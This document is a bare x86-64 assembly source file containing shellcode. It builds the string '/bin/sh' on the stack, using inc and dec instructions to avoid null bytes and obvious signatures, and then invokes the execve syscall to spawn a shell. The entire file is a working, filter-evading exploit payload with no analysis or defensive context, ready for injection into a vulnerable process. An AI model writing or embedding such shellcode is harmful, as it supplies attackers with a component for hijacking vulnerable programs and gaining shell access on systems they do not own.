;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

[BITS 64]

%define SYS_EXEC	59

[SECTION .TEXT]
	global _start

_start:
	push 0x6e69632d
	mov dword [rsp+4], 0x0168732d
	inc byte [rsp]
	inc byte [rsp]
	dec byte [rsp+1]
	inc byte [rsp+4]
	inc byte [rsp+4]
	dec byte [rsp+7]				; "/bin/sh"
	mov dl, byte [rsp+7]
	push rsp
	pop rdi							; rdi -> "/bin/sh\0"

	push rdx
	pop rsi							; rsi = 0

	push byte SYS_EXEC
	pop rax							; rax = SYS_EXEC

	syscall

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;